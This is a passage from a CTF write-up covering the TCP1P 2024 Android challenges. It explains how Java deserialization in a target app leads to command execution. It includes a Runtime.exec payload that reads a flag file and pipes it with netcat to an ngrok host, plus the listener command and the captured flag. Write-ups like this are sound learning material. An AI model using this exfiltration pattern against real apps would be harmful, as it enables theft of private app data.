<p>In order to construct the serialized object we should have <code class="language-plaintext highlighter-rouge">Testing.java</code> and <code class="language-plaintext highlighter-rouge">Testing2.java</code> in our project structure with same package name.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>project structure
-&gt;java
    -&gt;com
        -&gt;dimas.lookup
            -&gt;Testing.java
            -&gt;Testing2.java
        -&gt;example.tcpip
            -&gt;MainActivity.java
</code></pre></div></div>

<p><img src="../assets/2024/tcpip/tcpip4.png" alt="" style="display:block; margin-left:auto; margin-right:auto;width=50%;height=50%" /></p>

<p>In victims app logcat we can see that the output of our command <code class="language-plaintext highlighter-rouge">whomai</code> is run successfully. But now comes the hard part where I spent literally half day to get the flag. To get the flag we should read flag.txt in app files directory. But somehow I canâ€™t combine commands using pipe or redirect operator. After struggling for few hours I came to know that it is the default behaviour of javaâ€™s runtime exec.  Later using this <a href="https://code-white.com/blog/2015-03-sh-or-getting-shell-environment-from/">blog</a> I was able craft my payload with pipes.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">testing</span><span class="o">,</span><span class="s">"sh -c $@|sh . echo cat /data/user/0/com.dimas.lookup/files/fl* | nc 0.tcp.in.ngrok.io 12424"</span><span class="o">);</span>
</code></pre></div></div>

<p>This reads flag from the apps directory and pipes it to our netcat connection. Also android system has only few binaries. I couldnâ€™t find any other binaries to exfiltrate contents remotely.</p>

<p>Listening nc on port 9090 and using ngrok to port forward it, I was able to receive the flag from the remote system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~nc <span class="nt">-nlvp</span> 9090  <span class="o">&gt;</span> recvd
Connection received 

~cat recvd
TCP1P<span class="o">{</span>basic_deserialization_in_android_is_awssome_485846283<span class="o">}</span>
</code></pre></div></div>

<p>You can also use payload generator from <a href="https://ares-x.com/tools/runtime-exec/">here</a>. I wonâ€™t forgive java for this ðŸ˜­.</p>

<h3 id="password-manager-20-android">Password Manager 2.0 [Android]</h3>

<p>This is the only unsolved android challenge at end of CTF. But after the CTF ended, a CTF player posted his writeup <a href="https://www.lbyte.id/2024/10/15/writeup/TCP1P%202024:%20Mobile%20Writeup/">here</a>. I was able to read <code class="language-plaintext highlighter-rouge">pwds.yml</code> using vulnerable file provider during CTF, but still the writeup shows that it is a long way to achieve RCE.</p>


</article>
      </section>
    </div>
  </div>

   <footer>
  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
    <span>
        <b>grep-user</b>
    </span>
    
    <span>Â© 2024</span>
  </a>
</footer>

  
</body>

</html>